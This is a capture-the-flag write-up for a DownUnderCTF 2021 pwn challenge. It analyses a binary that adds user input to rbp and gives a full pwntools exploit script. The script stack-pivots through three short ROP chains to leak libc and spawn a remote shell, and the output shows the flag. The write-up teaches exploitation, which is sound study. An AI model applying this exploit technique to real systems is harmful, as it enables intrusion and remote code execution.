# DownUnderCTF 2021

## ready, bounce, pwn!

> 436  
>  
> Let's play with `rbp`.  
>  
> Author: joseph#8210  
>  
> `nc pwn-2021.duc.tf 31910`  
>  
> [`rbp`](rbp) [`libc.so.6`](libc.so.6)

Tags: _pwn_ _x86-64_ _stack-pivot_ _rop_ _remote-shell_

## Summary

The task description betrays the nature of this challenge; we're going to
stack pivot by corrupting `rbp`.

This challenge has a constrained buffer for our ROP chain, so some creativity
will be required.

## Analysis

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

Partial RELRO = GOT overwrite; No PIE = Easy ROP; No canary = Easy BOF.

### Decompile with Ghidra  

```c  
undefined8 main(EVP_PKEY_CTX *param_1)  
{  
 undefined local_28 [32];  
  
 init(param_1);  
 printf("Hi there! What is your name? ");  
 read(0,local_28,0x18);  
 puts("That is an interesting name.");  
 printf("Do you have a favourite number? ");  
 read_long();  
 return 0;  
}  
```

Nothing interesting here, however if you look at the disassembly you see that
whatever is returned (`rax`) from `read_long()` is added to `rbp` (`add
rbp,rax`):

```  
 401239:        e8 6b ff ff ff          call   4011a9 <read_long>  
 40123e:        48 01 c5                add    rbp,rax  
 401241:        b8 00 00 00 00          mov    eax,0x0  
 401246:        c9                      leave  
 401247:        c3                      ret  
```

IOW, a free stack pivot.  Recall that `leave` is really `mov rsp,rbp; pop
rbp`.  On `leave`, `rsp` will be `rbp` + whatever we added to it _less 8 (see
below)_.

Clearly we'd like to pivot to the top of our buffer for a ROP chain:

```  
0x00007fffffffe350│+0x0000: "AAAAAAAA"   ← $rsp  
0x00007fffffffe358│+0x0008: "BBBBBBBB"  
0x00007fffffffe360│+0x0010: "CCCCCCCC"  
0x00007fffffffe368│+0x0018: 0x0000000000000000  
0x00007fffffffe370│+0x0020: 0x0000000000000000   ← $rbp  
```

`read(0,local_28,0x18);` will `read` `24` (`0x18`) bytes limiting our ROP
chain to (3) 64-bit gadgets.  Above I entered `AAAAAAAABBBBBBBBCCCCCCCC` into
`read` as gadget placeholders.

`rbp` is currently `0x00007fffffffe370`, to move `rsp` to the start of our
buffer we'll need to _add_ `-0x20` (`-32`), however recall what I stated about
`leave` (above); right after the `mov rsp,rbp` is a `pop rbp`, so we'll need
an extra `-8` bytes _added_.  In short, `-40` entered to `read_long` will move
`rsp` to our buffer and start our ROP chain.

The classic ROP chain:

```  
p64(pop_rdi)  
p64(binary.got.puts)  
p64(binary.plt.puts)  
p64(binary.sym.main)  
```

_Catch leak, then..._

```  
p64(pop_rdi)  
p64(libc.search(b'/bin/sh').__next__())  
p64(libc.sym.system)  
```

To leak libc, loop back to main, then get a shell isn't going to fit in `24`
(`0x18`) bytes, however there's other gadgets we can use to breakup our ROP
chain into smaller chains we can then chain together (details in the Exploit
section below).

## Exploit

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./rbp')

if args.REMOTE:  
   p = remote('pwn-2021.duc.tf', 31910)  
   libc = ELF('./libc.so.6')  
else:  
   p = process(binary.path)  
   libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
```

Above, the standard pwntools header.

```python  
pop_rdi = binary.search(asm('pop rdi; ret;')).__next__()  
pop2 = binary.search(asm('pop r14; pop r15; ret;')).__next__()  
```

We'll need a couple of gadgets.  Since there's no PIE there's no need to leak
a base process address; we can just search the binary for the gadgets we need.
The first `pop_rdi` is standard fare ROP chain, then second comes from
`__libc_csu_init`; there's a variable number of `pop`s that we can use to move
`rsp` down stack.  This is how we'll continue on with our fragmented ROP
chain.

```python  
payload  = b''  
payload += p64(binary.sym.main)  
payload += p64(binary.plt.puts)  
payload += p64(binary.sym.main)

p.sendafter(b'name? ', payload)  
p.sendafter(b'number? ', b'-40')  
```

The first pass may look a bit counter intuitive, our code will immediately
loop back to `main`, however `main` will create a new stack frame leaving this
dirty dirty frame behind.

```python  
payload  = b''  
payload += p64(pop_rdi)  
payload += p64(binary.got.puts)  
payload += p64(pop2)

p.sendafter(b'name? ', payload)  
p.sendafter(b'number? ', b'-40')

libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts  
log.info('libc.address: ' + hex(libc.address))  
```

The second pass starts to look like a classic ROP chain.  That `pop2` will
move `rsp` down stack to the `binary.plt.puts` gadget above, then `main`, and
we get to start over again, however we now have a libc leak.

Here what the stack looks like just before the end of `main` (just before the
stack pivot to our 2nd ROP chain):

```  
0x00007ffd6a261cd0│+0x0000: 0x00000000004012b3  →  <__libc_csu_init+99> pop
rdi  ← $rsp  
0x00007ffd6a261cd8│+0x0008: 0x0000000000404018  →  0x00007f07996a55a0  →
<puts+0> endbr64  
0x00007ffd6a261ce0│+0x0010: 0x00000000004012b0  →  <__libc_csu_init+96> pop
r14  
0x00007ffd6a261ce8│+0x0018: 0x000000000040123e  →  <main+105> add rbp, rax  
0x00007ffd6a261cf0│+0x0020: 0x000000000040123e  →  <main+105> add rbp, rax  
0x00007ffd6a261cf8│+0x0028: 0x0000000000401030  →  <puts@plt+0> jmp QWORD PTR
[rip+0x2fe2]        # 0x404018 <[email protected]>  
0x00007ffd6a261d00│+0x0030: 0x00000000004011d5  →  <main+0> push rbp  
```

Observe that `pop rdi` will be called on `main` `ret`, popping the location of
`puts` into `rdi`, next is the `pop r14` from our `pop2` gadget curtesy of
`__libc_csu_init`, that `pop2` gadget will pop off the next to stack lines
moving `rsp` to `puts@plt`, effectively calling `puts` to leak libc.  Lastly
it's back to `main`.

```python  
payload  = b''  
payload += p64(pop_rdi)  
payload += p64(libc.search(b'/bin/sh').__next__())  
payload += p64(libc.sym.system)

p.sendafter(b'name? ', payload)  
p.sendafter(b'number? ', b'-40')  
p.interactive()  
```

Third pass.  We have the location of libc, so just get a shell.

Output:

```bash  
# ./exploit.py REMOTE=1  
[*] '/pwd/datajerk/downunderctf2021/rbp/rbp'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to pwn-2021.duc.tf on port 31910: Done  
[*] '/pwd/datajerk/downunderctf2021/rbp/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] libc.address: 0x7fdfab89d000  
[*] Switching to interactive mode  
$ cat flag.txt  
DUCTF{n0_0verfl0w?_n0_pr0bl3m!}  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/downunderctf2021/rbp).